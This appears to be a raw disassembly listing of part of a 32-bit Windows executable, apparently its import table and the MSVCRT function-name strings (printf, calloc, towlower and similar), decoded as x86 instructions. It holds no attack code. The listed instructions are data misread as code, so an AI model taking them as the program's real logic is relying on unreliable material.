  4134aa:	add    DWORD PTR [eax],eax
	...
  4134b4:	je     0x4134f8
  4134b6:	add    DWORD PTR [eax],eax
  4134b8:	mov    ah,0x30
  4134ba:	add    DWORD PTR [eax],eax
  4134bc:	nop
  4134bd:	aaa    
  4134be:	add    DWORD PTR [eax],eax
	...
  4134c8:	ins    BYTE PTR es:[edi],dx
  4134c9:	inc    ebp
  4134ca:	add    DWORD PTR [eax],eax
  4134cc:	jo     0x413500
  4134ce:	add    DWORD PTR [eax],eax
  4134d0:	dec    esp
  4134d1:	cmp    BYTE PTR [ecx],al
	...
  4134db:	add    dl,ah
  4134dd:	dec    eax
  4134de:	add    DWORD PTR [eax],eax
  4134e0:	sub    al,0x33
  4134e2:	add    DWORD PTR [eax],eax
  4134e4:	adc    al,0x39
  4134e6:	add    DWORD PTR [eax],eax
	...
  4134f0:	inc    edx
  4134f1:	dec    ecx
  4134f2:	add    DWORD PTR [eax],eax
  4134f4:	hlt    
  4134f5:	xor    eax,DWORD PTR [ecx]
  4134f7:	add    BYTE PTR [ecx+edi*1],ch
  4134fa:	add    DWORD PTR [eax],eax
	...
  413504:	bound  ecx,QWORD PTR [ecx+0x1]
  413507:	add    BYTE PTR [esp+esi*1],cl
  41350a:	add    DWORD PTR [eax],eax
	...
  413520:	xor    al,0x39
  413522:	add    DWORD PTR [eax],eax
  413524:	inc    edx
  413525:	cmp    DWORD PTR [ecx],eax
  413527:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41352b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41352f:	add    BYTE PTR [esi+0x39],bl
  413532:	add    DWORD PTR [eax],eax
  413534:	push   0x39
  413536:	add    DWORD PTR [eax],eax
  413538:	jl     0x413573
  41353a:	add    DWORD PTR [eax],eax
  41353c:	xchg   BYTE PTR [ecx],bh
  41353e:	add    DWORD PTR [eax],eax
  413540:	xchg   esp,eax
  413541:	cmp    DWORD PTR [ecx],eax
  413543:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41354a:	add    DWORD PTR [eax],eax
  41354c:	mov    ah,0x39
  41354e:	add    DWORD PTR [eax],eax
  413550:	les    edi,FWORD PTR [ecx]
  413552:	add    DWORD PTR [eax],eax
  413554:	into   
  413555:	cmp    DWORD PTR [ecx],eax
  413557:	add    dh,dl
  413559:	cmp    DWORD PTR [ecx],eax
  41355b:	add    dl,ah
  41355d:	cmp    DWORD PTR [ecx],eax
  41355f:	add    dl,ch
  413561:	cmp    DWORD PTR [ecx],eax
  413563:	add    ah,dh
  413565:	cmp    DWORD PTR [ecx],eax
  413567:	add    ah,bh
  413569:	cmp    DWORD PTR [ecx],eax
  41356b:	add    BYTE PTR [eax],cl
  41356d:	cmp    al,BYTE PTR [ecx]
  41356f:	add    BYTE PTR [edx],dl
  413571:	cmp    al,BYTE PTR [ecx]
  413573:	add    BYTE PTR [edx],bl
  413575:	cmp    al,BYTE PTR [ecx]
  413577:	add    BYTE PTR [edx+edi*1],ah
  41357a:	add    DWORD PTR [eax],eax
  41357c:	xor    BYTE PTR [edx],bh
  41357e:	add    DWORD PTR [eax],eax
  413580:	cmp    bh,BYTE PTR [edx]
  413582:	add    DWORD PTR [eax],eax
  413584:	dec    eax
  413585:	cmp    al,BYTE PTR [ecx]
  413587:	add    BYTE PTR [edx+0x3a],dl
  41358a:	add    DWORD PTR [eax],eax
  41358c:	pop    esi
  41358d:	cmp    al,BYTE PTR [ecx]
  41358f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413593:	add    BYTE PTR [edx+0x3a],bh
  413596:	add    DWORD PTR [eax],eax
  413598:	test   BYTE PTR [edx],bh
  41359a:	add    DWORD PTR [eax],eax
  41359c:	mov    ?,WORD PTR [edx]
  41359e:	add    DWORD PTR [eax],eax
  4135a0:	cwde   
  4135a1:	cmp    al,BYTE PTR [ecx]
  4135a3:	add    BYTE PTR [edx-0x55fffec6],ah
  4135a9:	cmp    al,BYTE PTR [ecx]
  4135ab:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  4135b2:	add    DWORD PTR [eax],eax
  4135b4:	enter  0x13a,0x0
  4135b8:	fdivr  QWORD PTR [edx]
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	out    0x3a,al
  4135be:	add    DWORD PTR [eax],eax
  4135c0:	repnz cmp al,BYTE PTR [ecx]
  4135c3:	add    dh,bh
  4135c5:	cmp    al,BYTE PTR [ecx]
  4135c7:	add    BYTE PTR [eax],cl
  4135c9:	cmp    eax,DWORD PTR [ecx]
  4135cb:	add    BYTE PTR [eax],bl
  4135cd:	cmp    eax,DWORD PTR [ecx]
  4135cf:	add    BYTE PTR [eax],al
  4135d1:	add    BYTE PTR [eax],al
  4135d3:	add    BYTE PTR [esi],ch
  4135d5:	cmp    eax,DWORD PTR [ecx]
  4135d7:	add    BYTE PTR [edx+0x3b],al
  4135da:	add    DWORD PTR [eax],eax
  4135dc:	pop    eax
  4135dd:	cmp    eax,DWORD PTR [ecx]
  4135df:	add    BYTE PTR [eax+0x3b],ch
  4135e2:	add    DWORD PTR [eax],eax
  4135e4:	je     0x413621
  4135e6:	add    DWORD PTR [eax],eax
  4135e8:	nop
  4135e9:	cmp    eax,DWORD PTR [ecx]
  4135eb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4135f2:	add    DWORD PTR [eax],eax
  4135f4:	int3   
  4135f5:	cmp    eax,DWORD PTR [ecx]
  4135f7:	add    dl,bl
  4135f9:	cmp    eax,DWORD PTR [ecx]
  4135fb:	add    dh,ah
  4135fd:	cmp    eax,DWORD PTR [ecx]
  4135ff:	add    al,bh
  413601:	cmp    eax,DWORD PTR [ecx]
  413603:	add    BYTE PTR [esp+edi*1],cl
  413606:	add    DWORD PTR [eax],eax
  413608:	sbb    bh,BYTE PTR [ecx+eax*1]
  41360b:	add    BYTE PTR [edx],ch
  41360d:	cmp    al,0x1
  41360f:	add    BYTE PTR [edx],bh
  413611:	cmp    al,0x1
  413613:	add    BYTE PTR [esi+0x3c],cl
  413616:	add    DWORD PTR [eax],eax
  413618:	pop    edx
  413619:	cmp    al,0x1
  41361b:	add    BYTE PTR [edx+0x3c],ch
  41361e:	add    DWORD PTR [eax],eax
  413620:	js     0x41365e
  413622:	add    DWORD PTR [eax],eax
  413624:	xchg   edx,eax
  413625:	cmp    al,0x1
  413627:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41362e:	add    DWORD PTR [eax],eax
  413630:	ret    0x13c
  413633:	add    ah,dl
  413635:	cmp    al,0x1
  413637:	add    dh,ah
  413639:	cmp    al,0x1
  41363b:	add    ah,dh
  41363d:	cmp    al,0x1
  41363f:	add    dh,bh
  413641:	cmp    al,0x1
  413643:	add    BYTE PTR [esi],cl
  413645:	cmp    eax,0x3d1e0001
  41364a:	add    DWORD PTR [eax],eax
  41364c:	sub    al,0x3d
  41364e:	add    DWORD PTR [eax],eax
  413650:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413656:	add    DWORD PTR [eax],eax
  413658:	pop    eax
  413659:	cmp    eax,0x3d6e0001
  41365e:	add    DWORD PTR [eax],eax
  413660:	cmp    BYTE PTR ds:0x3d920001,0x1
  413667:	add    BYTE PTR [esi-0x45fffec3],ah
  41366d:	cmp    eax,0x3dce0001
  413672:	add    DWORD PTR [eax],eax
  413674:	jmp    0x13d:0xf800013d
  41367b:	add    BYTE PTR [esi],al
  41367d:	add    DWORD PTR ds:[eax],eax
  413680:	sbb    al,0x3e
  413682:	add    DWORD PTR [eax],eax
  413684:	sub    bh,BYTE PTR [esi]
  413686:	add    DWORD PTR [eax],eax
  413688:	cmp    al,0x3e
  41368a:	add    DWORD PTR [eax],eax
  41368c:	dec    eax
  41368d:	add    DWORD PTR ds:[eax],eax
  413690:	pop    esp
  413691:	add    DWORD PTR ds:[eax],eax
  413694:	ins    BYTE PTR es:[edi],dx
  413695:	add    DWORD PTR ds:[eax],eax
  413698:	jl     0x4136d8
  41369a:	add    DWORD PTR [eax],eax
  41369c:	mov    BYTE PTR [esi],bh
  41369e:	add    DWORD PTR [eax],eax
  4136a0:	cwde   
  4136a1:	add    DWORD PTR ds:[eax],eax
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	add    DWORD PTR ds:[eax],eax
  4136a8:	mov    edx,0xcc00013e
  4136ad:	add    DWORD PTR ds:[eax],eax
  4136b0:	fidivr DWORD PTR [esi]
  4136b2:	add    DWORD PTR [eax],eax
  4136b4:	lock add DWORD PTR ds:[eax],eax
  4136b8:	(bad)  
  4136b9:	add    DWORD PTR ds:[eax],eax
  4136bc:	push   cs
  4136bd:	aas    
  4136be:	add    DWORD PTR [eax],eax
  4136c0:	sbb    bh,BYTE PTR [edi]
  4136c2:	add    DWORD PTR [eax],eax
  4136c4:	sub    bh,BYTE PTR [edi]
  4136c6:	add    DWORD PTR [eax],eax
  4136c8:	cmp    BYTE PTR [edi],bh
  4136ca:	add    DWORD PTR [eax],eax
  4136cc:	dec    esi
  4136cd:	aas    
  4136ce:	add    DWORD PTR [eax],eax
  4136d0:	bound  edi,QWORD PTR [edi]
  4136d2:	add    DWORD PTR [eax],eax
  4136d4:	outs   dx,BYTE PTR ds:[esi]
  4136d5:	aas    
  4136d6:	add    DWORD PTR [eax],eax
  4136d8:	js     0x413719
  4136da:	add    DWORD PTR [eax],eax
  4136dc:	xchg   BYTE PTR [edi],bh
  4136de:	add    DWORD PTR [eax],eax
  4136e0:	xchg   esp,eax
  4136e1:	aas    
  4136e2:	add    DWORD PTR [eax],eax
  4136e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e5:	aas    
  4136e6:	add    DWORD PTR [eax],eax
  4136e8:	mov    dh,0x3f
  4136ea:	add    DWORD PTR [eax],eax
  4136ec:	enter  0x13f,0x0
  4136f0:	fidivr DWORD PTR [edi]
  4136f2:	add    DWORD PTR [eax],eax
  4136f4:	in     al,dx
  4136f5:	aas    
  4136f6:	add    DWORD PTR [eax],eax
  4136f8:	clc    
  4136f9:	aas    
  4136fa:	add    DWORD PTR [eax],eax
  4136fc:	or     al,BYTE PTR [eax+0x1]
  4136ff:	add    BYTE PTR [edx],ah
  413701:	inc    eax
  413702:	add    DWORD PTR [eax],eax
  413704:	xor    al,0x40
  413706:	add    DWORD PTR [eax],eax
  413708:	dec    eax
  413709:	inc    eax
  41370a:	add    DWORD PTR [eax],eax
  41370c:	pop    edx
  41370d:	inc    eax
  41370e:	add    DWORD PTR [eax],eax
  413710:	fs inc eax
  413712:	add    DWORD PTR [eax],eax
  413714:	je     0x413756
  413716:	add    DWORD PTR [eax],eax
  413718:	add    BYTE PTR [eax+0x1],0x0
  41371c:	cwde   
  41371d:	inc    eax
  41371e:	add    DWORD PTR [eax],eax
  413720:	lods   al,BYTE PTR ds:[esi]
  413721:	inc    eax
  413722:	add    DWORD PTR [eax],eax
  413724:	mov    esp,0xca000140
  413729:	inc    eax
  41372a:	add    DWORD PTR [eax],eax
  41372c:	loopne 0x41376e
  41372e:	add    DWORD PTR [eax],eax
  413730:	lock inc eax
  413732:	add    DWORD PTR [eax],eax
  413734:	or     BYTE PTR [ecx+0x1],al
  413737:	add    BYTE PTR [esi],dl
  413739:	inc    ecx
  41373a:	add    DWORD PTR [eax],eax
  41373c:	sub    BYTE PTR [ecx+0x1],al
  41373f:	add    BYTE PTR [esi],dh
  413741:	inc    ecx
  413742:	add    DWORD PTR [eax],eax
  413744:	inc    esp
  413745:	inc    ecx
  413746:	add    DWORD PTR [eax],eax
  413748:	push   edx
  413749:	inc    ecx
  41374a:	add    DWORD PTR [eax],eax
  41374c:	pusha  
  41374d:	inc    ecx
  41374e:	add    DWORD PTR [eax],eax
  413750:	jo     0x413793
  413752:	add    DWORD PTR [eax],eax
  413754:	test   BYTE PTR [ecx+0x1],al
  413757:	add    BYTE PTR [edx-0x5ffffebf],dl
  41375d:	inc    ecx
  41375e:	add    DWORD PTR [eax],eax
  413760:	scas   al,BYTE PTR es:[edi]
  413761:	inc    ecx
  413762:	add    DWORD PTR [eax],eax
  413764:	mov    esi,0xd6000141
  413769:	inc    ecx
  41376a:	add    DWORD PTR [eax],eax
  41376c:	call   0xfa4138b2
  413771:	inc    ecx
  413772:	add    DWORD PTR [eax],eax
  413774:	push   es
  413775:	inc    edx
  413776:	add    DWORD PTR [eax],eax
  413778:	sbb    BYTE PTR [edx+0x1],al
  41377b:	add    BYTE PTR [esi],ch
  41377d:	inc    edx
  41377e:	add    DWORD PTR [eax],eax
  413780:	cmp    al,BYTE PTR [edx+0x1]
  413783:	add    BYTE PTR [esi+0x42],cl
  413786:	add    DWORD PTR [eax],eax
  413788:	pusha  
  413789:	inc    edx
  41378a:	add    DWORD PTR [eax],eax
  41378c:	add    BYTE PTR [eax],al
  41378e:	add    BYTE PTR [eax],al
  413790:	add    BYTE PTR [edx+0x1],0x0
  413794:	cwde   
  413795:	inc    edx
  413796:	add    DWORD PTR [eax],eax
  413798:	scas   al,BYTE PTR es:[edi]
  413799:	inc    edx
  41379a:	add    DWORD PTR [eax],eax
  41379c:	mov    edx,0xca000142
  4137a1:	inc    edx
  4137a2:	add    DWORD PTR [eax],eax
  4137a4:	fadd   QWORD PTR [edx+0x1]
  4137a7:	add    ah,ch
  4137a9:	inc    edx
  4137aa:	add    DWORD PTR [eax],eax
  4137ac:	clc    
  4137ad:	inc    edx
  4137ae:	add    DWORD PTR [eax],eax
  4137b0:	push   cs
  4137b1:	inc    ebx
  4137b2:	add    DWORD PTR [eax],eax
  4137b4:	sbb    BYTE PTR [ebx+0x1],al
  4137b7:	add    BYTE PTR [ebx+eax*2],ah
  4137ba:	add    DWORD PTR [eax],eax
  4137bc:	xor    al,BYTE PTR [ebx+0x1]
  4137bf:	add    BYTE PTR [edx+0x43],al
  4137c2:	add    DWORD PTR [eax],eax
  4137c4:	push   eax
  4137c5:	inc    ebx
  4137c6:	add    DWORD PTR [eax],eax
  4137c8:	pop    edx
  4137c9:	inc    ebx
  4137ca:	add    DWORD PTR [eax],eax
  4137cc:	outs   dx,BYTE PTR ds:[esi]
  4137cd:	inc    ebx
  4137ce:	add    DWORD PTR [eax],eax
  4137d0:	test   BYTE PTR [ebx+0x1],al
  4137d3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4137da:	add    DWORD PTR [eax],eax
  4137dc:	mov    eax,0xcc000143
  4137e1:	inc    ebx
  4137e2:	add    DWORD PTR [eax],eax
  4137e4:	fiadd  DWORD PTR [ebx+0x1]
  4137e7:	add    dl,ch
  4137e9:	inc    ebx
  4137ea:	add    DWORD PTR [eax],eax
  4137ec:	clc    
  4137ed:	inc    ebx
  4137ee:	add    DWORD PTR [eax],eax
  4137f0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4137f4:	adc    al,0x44
  4137f6:	add    DWORD PTR [eax],eax
  4137f8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4137fc:	xor    al,0x44
  4137fe:	add    DWORD PTR [eax],eax
  413800:	inc    esi
  413801:	inc    esp
  413802:	add    DWORD PTR [eax],eax
  413804:	pop    edx
  413805:	inc    esp
  413806:	add    DWORD PTR [eax],eax
  413808:	inc    sp
  41380a:	add    DWORD PTR [eax],eax
  41380c:	jbe    0x413852
  41380e:	add    DWORD PTR [eax],eax
  413810:	mov    es,WORD PTR [ecx+eax*1+0x0]
  413814:	sahf   
  413815:	inc    esp
  413816:	add    DWORD PTR [eax],eax
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	inc    esp
  41381a:	add    DWORD PTR [eax],eax
  41381c:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413821:	inc    esp
  413822:	add    DWORD PTR [eax],eax
  413824:	in     al,dx
  413825:	inc    esp
  413826:	add    DWORD PTR [eax],eax
  413828:	clc    
  413829:	inc    esp
  41382a:	add    DWORD PTR [eax],eax
  41382c:	or     al,BYTE PTR [ebp+0x1]
  41382f:	add    BYTE PTR [esi],bl
  413831:	inc    ebp
  413832:	add    DWORD PTR [eax],eax
  413834:	sub    BYTE PTR [ebp+0x1],al
  413837:	add    BYTE PTR [eax],bh
  413839:	inc    ebp
  41383a:	add    DWORD PTR [eax],eax
  41383c:	inc    esp
  41383d:	inc    ebp
  41383e:	add    DWORD PTR [eax],eax
  413840:	dec    esi
  413841:	inc    ebp
  413842:	add    DWORD PTR [eax],eax
  413844:	pop    edx
  413845:	inc    ebp
  413846:	add    DWORD PTR [eax],eax
  413848:	add    BYTE PTR [eax],al
  41384a:	add    BYTE PTR [eax],al
  41384c:	jbe    0x413893
  41384e:	add    DWORD PTR [eax],eax
  413850:	mov    BYTE PTR [ebp+0x1],al
  413853:	add    BYTE PTR [eax-0x51fffebb],ah
  413859:	inc    ebp
  41385a:	add    DWORD PTR [eax],eax
  41385c:	retf   0x145
  41385f:	add    ah,bl
  413861:	inc    ebp
  413862:	add    DWORD PTR [eax],eax
  413864:	in     al,dx
  413865:	inc    ebp
  413866:	add    DWORD PTR [eax],eax
  413868:	add    BYTE PTR [esi+0x1],al
  41386b:	add    BYTE PTR [eax],bl
  41386d:	inc    esi
  41386e:	add    DWORD PTR [eax],eax
  413870:	sub    al,BYTE PTR [esi+0x1]
  413873:	add    BYTE PTR [esi],dh
  413875:	inc    esi
  413876:	add    DWORD PTR [eax],eax
  413878:	dec    edx
  413879:	inc    esi
  41387a:	add    DWORD PTR [eax],eax
  41387c:	pusha  
  41387d:	inc    esi
  41387e:	add    DWORD PTR [eax],eax
  413880:	ins    BYTE PTR es:[edi],dx
  413881:	inc    esi
  413882:	add    DWORD PTR [eax],eax
  413884:	add    BYTE PTR [esi+0x1],0x0
  413888:	xchg   esp,eax
  413889:	inc    esi
  41388a:	add    DWORD PTR [eax],eax
  41388c:	mov    al,ds:0xae000146
  413891:	inc    esi
  413892:	add    DWORD PTR [eax],eax
  413894:	ret    0x146
  413897:	add    dl,bl
  413899:	inc    esi
  41389a:	add    DWORD PTR [eax],eax
  41389c:	call   0xf24139e7
  4138a1:	inc    esi
  4138a2:	add    DWORD PTR [eax],eax
  4138a4:	inc    BYTE PTR [esi+0x1]
  4138a7:	add    BYTE PTR [esi],cl
  4138a9:	inc    edi
  4138aa:	add    DWORD PTR [eax],eax
  4138ac:	and    al,0x47
  4138ae:	add    DWORD PTR [eax],eax
  4138b0:	cmp    al,BYTE PTR [edi+0x1]
  4138b3:	add    BYTE PTR [edi+eax*2+0x1],cl
  4138b7:	add    BYTE PTR [edx+0x47],bl
  4138ba:	add    DWORD PTR [eax],eax
  4138bc:	push   0x47
  4138be:	add    DWORD PTR [eax],eax
  4138c0:	jle    0x413909
  4138c2:	add    DWORD PTR [eax],eax
  4138c4:	xchg   esi,eax
  4138c5:	inc    edi
  4138c6:	add    DWORD PTR [eax],eax
  4138c8:	mov    ds:0xba000147,al
  4138cd:	inc    edi
  4138ce:	add    DWORD PTR [eax],eax
  4138d0:	int3   
  4138d1:	inc    edi
  4138d2:	add    DWORD PTR [eax],eax
  4138d4:	fadd   QWORD PTR [edi+0x1]
  4138d7:	add    al,dh
  4138d9:	inc    edi
  4138da:	add    DWORD PTR [eax],eax
  4138dc:	push   es
  4138dd:	dec    eax
  4138de:	add    DWORD PTR [eax],eax
  4138e0:	sbb    cl,BYTE PTR [eax+0x1]
  4138e3:	add    BYTE PTR [eax],ch
  4138e5:	dec    eax
  4138e6:	add    DWORD PTR [eax],eax
  4138e8:	cmp    cl,BYTE PTR [eax+0x1]
  4138eb:	add    BYTE PTR [eax+0x48],cl
  4138ee:	add    DWORD PTR [eax],eax
  4138f0:	push   esp
  4138f1:	dec    eax
  4138f2:	add    DWORD PTR [eax],eax
  4138f4:	outs   dx,BYTE PTR ds:[esi]
  4138f5:	dec    eax
  4138f6:	add    DWORD PTR [eax],eax
  4138f8:	mov    BYTE PTR [eax+0x1],cl
  4138fb:	add    BYTE PTR [eax-0x59fffeb8],bl
  413901:	dec    eax
  413902:	add    DWORD PTR [eax],eax
  413904:	mov    dl,0x48
  413906:	add    DWORD PTR [eax],eax
  413908:	ror    BYTE PTR [eax+0x1],0x0
  41390c:	(bad)  
  41390d:	dec    eax
  41390e:	add    DWORD PTR [eax],eax
  413910:	add    BYTE PTR [eax],al
  413912:	add    BYTE PTR [eax],al
  413914:	lock dec eax
  413916:	add    DWORD PTR [eax],eax
  413918:	dec    BYTE PTR [eax+0x1]
  41391b:	add    BYTE PTR [esi],cl
  41391d:	dec    ecx
  41391e:	add    DWORD PTR [eax],eax
  413920:	push   ds
  413921:	dec    ecx
  413922:	add    DWORD PTR [eax],eax
  413924:	cs dec ecx
  413926:	add    DWORD PTR [eax],eax
  413928:	add    BYTE PTR [eax],al
  41392a:	add    BYTE PTR [eax],al
  41392c:	push   eax
  41392d:	dec    ecx
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [eax],al
  413932:	add    BYTE PTR [eax],al
  413934:	cmc    
  413935:	add    BYTE PTR [edi+0x63],bl
  413938:	outs   dx,DWORD PTR ds:[esi]
  413939:	outs   dx,BYTE PTR ds:[esi]
  41393a:	je     0x4139ae
  41393c:	outs   dx,DWORD PTR ds:[esi]
  41393d:	ins    BYTE PTR es:[edi],dx
  41393e:	data16 jo 0x413941
  413941:	add    BYTE PTR [ebp+0x3],bl
  413944:	arpl   WORD PTR [ecx+0x6c],sp
  413947:	ins    BYTE PTR es:[edi],dx
  413948:	outs   dx,DWORD PTR ds:[esi]
  413949:	arpl   WORD PTR [eax],ax
  41394b:	add    BYTE PTR [edx+0x3],dh
  41394e:	data16 ins BYTE PTR es:[edi],dx
  413950:	outs   dx,DWORD PTR ds:[esi]
  413951:	outs   dx,DWORD PTR ds:[esi]
  413952:	jb     0x413954
  413954:	push   ds
  413955:	add    al,0x77
  413957:	arpl   WORD PTR [ebx+0x63],si
  41395a:	push   0xb000072
  41395f:	add    al,0x74
  413961:	outs   dx,DWORD PTR ds:[esi]
  413962:	ja     0x4139d0
  413964:	outs   dx,DWORD PTR ds:[esi]
  413965:	ja     0x4139cc
  413967:	jb     0x413969
  413969:	add    BYTE PTR [ebx+0x735f5f00],dh
  41396f:	gs je  0x4139d1
  413972:	popa   
  413973:	jo     0x4139e5
  413975:	pop    edi
  413976:	je     0x4139f1
  413978:	jo     0x4139df
  41397a:	add    BYTE PTR [eax],al
  41397c:	in     eax,0x3
  41397e:	jae    0x4139f4
  413980:	jb     0x4139e5
  413982:	push   0xa0000072
  413987:	add    BYTE PTR [edi+0x5f],bl
  41398a:	jo     0x4139eb
  41398c:	pop    edi
  41398d:	ins    WORD PTR es:[edi],dx
  41398f:	outs   dx,DWORD PTR ds:[esi]
  413990:	fs add BYTE PTR gs:[eax],al
  413994:	int3   
  413995:	add    esi,DWORD PTR [ecx+0x73]
  413998:	outs   dx,DWORD PTR ds:[esi]
  413999:	jb     0x413a0f
  41399b:	add    BYTE PTR [ebx+0x77736903],ch
  4139a1:	js     0x413a07
  4139a3:	imul   esp,DWORD PTR [edi+0x69],0x3a00074
  4139aa:	imul   esi,DWORD PTR [ebx+0x77],0x68706c61
  4139b1:	popa   
  4139b2:	add    BYTE PTR [eax],al
  4139b4:	fwait
  4139b5:	add    BYTE PTR [edi+0x5f],bl
  4139b8:	jo     0x413a19
  4139ba:	pop    edi
  4139bb:	arpl   WORD PTR [edi+0x6d],bp
  4139be:	ins    DWORD PTR es:[edi],dx
  4139bf:	outs   dx,DWORD PTR ds:[esi]
  4139c0:	fs add BYTE PTR gs:[eax],al
  4139c4:	sub    BYTE PTR [edi+esi*2],al
  4139c7:	arpl   WORD PTR [ebx+0x6e],si
  4139ca:	arpl   WORD PTR [ebp+0x70],bp
  4139cd:	add    BYTE PTR [ebp+0x3],bh
  4139d0:	data16 jb 0x413a38
  4139d3:	add    BYTE PTR gs:[eax],al
  4139d6:	or     al,0x4
  4139d8:	je     0x413a49
  4139da:	ja     0x413a51
  4139dc:	jo     0x413a4e
  4139de:	gs jb  0x4139e1
  4139e1:	add    BYTE PTR [ecx+0x3],bh
  4139e4:	data16 jo 0x413a5c
  4139e7:	je     0x413a5c
  4139e9:	add    BYTE PTR [ebp+0x74656703],cl
  4139ef:	outs   dx,BYTE PTR gs:[esi]
  4139f1:	jbe    0x4139f3
  4139f3:	add    BYTE PTR [eax+0x3],ah
  4139f6:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4139fa:	imul   eax,DWORD PTR [eax],0xffffffff
  4139fd:	add    esi,DWORD PTR [ebx+0x77]
  413a00:	jo     0x413a74
  413a02:	imul   ebp,DWORD PTR [esi+0x74],0xc8000066
  413a09:	add    esi,DWORD PTR [eax+0x75]
  413a0c:	je     0x413a71
  413a0e:	push   0xc9007261
  413a13:	add    esi,DWORD PTR [eax+0x75]
  413a16:	je     0x413a8b
  413a18:	add    BYTE PTR [eax],al
  413a1a:	mov    ecx,0x74626d03
  413a1f:	outs   dx,DWORD PTR ds:[esi]
  413a20:	ja     0x413a85
  413a22:	add    BYTE PTR [eax],al
  413a24:	test   eax,0x77736903
  413a29:	jae    0x413a9b
  413a2b:	popa   
  413a2c:	arpl   WORD PTR [ebp+0x0],sp
  413a2f:	add    BYTE PTR [ecx],cl
  413a31:	add    al,0x74
  413a33:	outs   dx,DWORD PTR ds:[esi]
  413a34:	ins    BYTE PTR es:[edi],dx
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	ja     0x413a9d
  413a38:	jb     0x413a3a
  413a3a:	fild   DWORD PTR [eax]
  413a3c:	pop    edi
  413a3d:	popa   
  413a3e:	ins    DWORD PTR es:[edi],dx
  413a3f:	jae    0x413aa8
  413a41:	pop    edi
  413a42:	gs js  0x413aae
  413a45:	je     0x413a47
  413a47:	add    ch,al
  413a49:	add    esi,DWORD PTR [eax+0x72]
  413a4c:	imul   ebp,DWORD PTR [esi+0x74],0x86000066
  413a53:	add    DWORD PTR [edi+0x69],ebx
  413a56:	outs   dx,BYTE PTR ds:[esi]
  413a57:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x9e006d72
  413a5f:	add    DWORD PTR [edi+0x69],ebx
  413a62:	jae    0x413ad1
  413a64:	bound  esp,QWORD PTR [edx+0x6c]
  413a67:	gs popa 
  413a69:	add    BYTE PTR fs:[eax],al
  413a6c:	push   edx
  413a6d:	add    BYTE PTR [edi+0x58],bl
  413a70:	arpl   WORD PTR [eax+0x74],si
  413a73:	inc    esi
  413a74:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3f10072
  413a7c:	jae    0x413af2
  413a7e:	jb     0x413aee
  413a80:	arpl   WORD PTR [ebp+0x70],bp
  413a83:	add    dl,dl
  413a85:	add    esi,DWORD PTR [edx+0x65]
  413a88:	ins    DWORD PTR es:[edi],dx
  413a89:	outs   dx,DWORD PTR ds:[esi]
  413a8a:	jbe    0x413af1
  413a8c:	add    BYTE PTR [eax],al
  413a8e:	cld    
  413a8f:	add    esi,DWORD PTR [ebx+0x74]
  413a92:	jb     0x413b08
  413a94:	outs   dx,DWORD PTR ds:[esi]
  413a95:	ins    BYTE PTR es:[edi],dx
  413a96:	add    BYTE PTR [eax],al
  413a98:	and    eax,0x73637704
  413a9d:	ins    BYTE PTR es:[edi],dx
  413a9e:	outs   dx,BYTE PTR gs:[esi]
  413aa0:	add    BYTE PTR [eax],al
  413aa2:	and    eax,DWORD PTR [ecx]
  413aa4:	pop    edi
  413aa5:	gs js  0x413b11
  413aa8:	je     0x413aaa
  413aaa:	call   0x65a499af
  413aaf:	js     0x413b1a
  413ab1:	je     0x413ab3
  413ab3:	add    BYTE PTR [ebp+0x73736903],bl
  413ab9:	jo     0x413b1c
  413abb:	arpl   WORD PTR [ebp+0x0],sp
  413abe:	call   0x72b5adc6
  413ac3:	arpl   WORD PTR [eax+0x79],si
  413ac6:	add    BYTE PTR [eax],al
  413ac8:	mov    ch,0x0
  413aca:	pop    edi
  413acb:	pop    edi
  413acc:	jae    0x413b33
  413ace:	je     0x413b45
  413ad0:	jae    0x413b37
  413ad2:	jb     0x413b41
  413ad4:	popa   
  413ad5:	je     0x413b3f
  413ad7:	gs jb  0x413b4c
  413ada:	add    BYTE PTR [eax],al
  413adc:	repnz add esi,DWORD PTR [ebx+0x74]
  413ae0:	jb     0x413b50
  413ae2:	arpl   WORD PTR [eax+0x79],si
  413ae5:	add    BYTE PTR [ebx+eax*1+0x64777369],ah
  413aec:	imul   esp,DWORD PTR [edi+0x69],0xa3000074
  413af3:	add    ebp,DWORD PTR [ecx+0x73]
  413af6:	ja     0x413b5b
  413af8:	je     0x413b73
  413afa:	jo     0x413b61
  413afc:	add    BYTE PTR [eax],al
  413afe:	mov    ch,0x3
  413b00:	ins    DWORD PTR es:[edi],dx
  413b01:	popa   
  413b02:	ins    BYTE PTR es:[edi],dx
  413b03:	ins    BYTE PTR es:[edi],dx
  413b04:	outs   dx,DWORD PTR ds:[esi]
  413b05:	arpl   WORD PTR [eax],ax
  413b07:	add    BYTE PTR [edx+0x0],dh
  413b0a:	pop    edi
  413b0b:	pop    edi
  413b0c:	addr16 gs je 0x413b7d
  413b10:	popa   
  413b11:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413b18:	add    DWORD PTR [ebx+esi*2],eax
  413b1b:	ja     0x413b90
  413b1d:	arpl   WORD PTR [ecx+0x6e],sp
  413b20:	data16 add BYTE PTR [ebp+0x53],cl
  413b24:	push   esi
  413b25:	inc    ebx
  413b26:	push   edx
  413b27:	push   esp
  413b28:	cs fs ins BYTE PTR es:[edi],dx
  413b2b:	ins    BYTE PTR es:[edi],dx
  413b2c:	add    BYTE PTR [eax],al
  413b2e:	xor    eax,0x74654701
  413b33:	dec    ebp
  413b34:	outs   dx,BYTE PTR gs:[esi]
  413b36:	jne    0x413b81
  413b38:	je     0x413b9f
